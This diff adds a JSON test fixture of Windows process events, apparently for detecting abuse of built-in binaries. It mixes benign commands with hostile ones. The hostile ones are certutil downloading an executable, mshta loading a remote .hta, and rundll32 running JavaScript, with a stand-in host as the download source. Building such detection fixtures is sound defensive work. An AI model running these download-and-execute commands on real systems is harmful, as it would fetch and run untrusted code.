@@ -1,0 +1,26 @@
+[
+  {
+    "Image": "C:\\Windows\\System32\\certutil.exe",
+    "CommandLine": "certutil -urlcache -split -f http://example.invalid/a.exe C:\\lab\\a.exe"
+  },
+  {
+    "Image": "C:\\Windows\\System32\\certutil.exe",
+    "CommandLine": "certutil -store My"
+  },
+  {
+    "Image": "C:\\Windows\\System32\\rundll32.exe",
+    "CommandLine": "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication\""
+  },
+  {
+    "Image": "C:\\Windows\\System32\\rundll32.exe",
+    "CommandLine": "rundll32.exe shell32.dll,Control_RunDLL"
+  },
+  {
+    "Image": "C:\\Windows\\System32\\mshta.exe",
+    "CommandLine": "mshta.exe http://example.invalid/a.hta"
+  },
+  {
+    "Image": "C:\\Windows\\System32\\notepad.exe",
+    "CommandLine": "notepad.exe"
+  }
+]
